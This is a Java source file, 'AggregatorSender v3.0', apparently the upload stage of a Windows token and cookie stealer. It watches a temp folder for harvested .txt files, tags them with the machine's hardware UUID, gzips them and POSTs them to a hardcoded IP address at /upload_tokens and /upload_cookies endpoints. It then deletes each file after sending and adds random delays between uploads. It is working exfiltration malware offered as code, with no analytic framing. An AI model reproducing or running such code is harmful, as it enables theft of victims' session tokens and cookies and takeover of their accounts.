import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;
import java.util.concurrent.*;
import java.security.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class AggregatorSender {
    private static final String EXTRACTED_DIR = System.getenv("TEMP") + "\\SWILL_DEC\\extracted";
    private static final String SERVER_URL = "http://26.184.88.227:8891";
    private static final String HWID = getHWID();
    private static final Set<String> sentFiles = ConcurrentHashMap.newKeySet();
    private static final String SENT_LOG = System.getenv("TEMP") + "\\SWILL_DEC\\sent_files.log";
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Aggregator][" + timestamp + "] " + msg);
    }
    
    public static void main(String[] args) {
        log("AggregatorSender v3.0 started");
        log("HWID: " + HWID);
        log("Server: " + SERVER_URL);
        log("Watching: " + EXTRACTED_DIR);
        
        // Загружаем ранее отправленные файлы
        loadSentFiles();
        
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(() -> {
            try { processAndSend(); } 
            catch (Exception e) { log("Error: " + e.getMessage()); }
        }, 10, 60, TimeUnit.SECONDS);
        
        log("AggregatorSender running (check every 60s)");
    }
    
    private static void loadSentFiles() {
        File logFile = new File(SENT_LOG);
        if (logFile.exists()) {
            try {
                Files.lines(logFile.toPath()).forEach(line -> sentFiles.add(line.trim()));
                log("Loaded " + sentFiles.size() + " previously sent files");
            } catch (IOException e) {
                log("Could not load sent files log");
            }
        }
    }
    
    private static void saveSentFile(String fileName) {
        try {
            Files.write(Paths.get(SENT_LOG), (fileName + "\n").getBytes(), 
                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException e) {}
    }
    
    private static void processAndSend() {
        File dir = new File(EXTRACTED_DIR);
        if (!dir.exists()) {
            log("Directory not found: " + EXTRACTED_DIR);
            return;
        }
        
        File[] files = dir.listFiles((d, n) -> n.endsWith(".txt"));
        if (files == null || files.length == 0) {
            return;
        }
        
        log("Found " + files.length + " file(s) to process");
        
        for (File f : files) {
            // Пропускаем уже отправленные файлы
            if (sentFiles.contains(f.getName())) {
                log("Skipping already sent: " + f.getName());
                continue;
            }
            
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                if (content.trim().isEmpty() || content.contains("No tokens found")) {
                    log("Skipping empty/useless: " + f.getName());
                    f.delete();
                    continue;
                }
                
                log("Preparing to send: " + f.getName() + " (" + content.length() + " bytes)");
                Thread.sleep(200 + (int)(Math.random() * 300));
                
                boolean success = sendData(f.getName(), content);
                
                if (success) {
                    sentFiles.add(f.getName());
                    saveSentFile(f.getName());
                    f.delete();
                    log("Sent and deleted: " + f.getName());
                } else {
                    log("Failed to send: " + f.getName());
                }
                
            } catch (Exception e) {
                log("Error processing " + f.getName() + ": " + e.getMessage());
            }
        }
    }
    
    private static boolean sendData(String name, String data) {
        HttpURLConnection conn = null;
        try {
            String urlStr = name.contains("tokens") ? SERVER_URL + "/upload_tokens" : SERVER_URL + "/upload_cookies";
            String payload = "HWID: " + HWID + "\nFILE: " + name + "\n" + data;
            
            log("Connecting to: " + urlStr);
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(15000);
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            GZIPOutputStream gzip = new GZIPOutputStream(bos);
            gzip.write(payload.getBytes());
            gzip.close();
            
            conn.setRequestProperty("Content-Encoding", "gzip");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.getOutputStream().write(bos.toByteArray());
            conn.getOutputStream().close();
            
            int code = conn.getResponseCode();
            log("Server response: HTTP " + code);
            
            return code == 200;
            
        } catch (Exception e) {
            log("Connection error: " + e.getMessage());
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    private static String getHWID() {
        try {
            Process p = Runtime.getRuntime().exec("wmic csproduct get uuid");
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                if (line.contains("-")) return line.trim();
            }
        } catch (Exception e) {}
        return "UNKNOWN";
    }
}
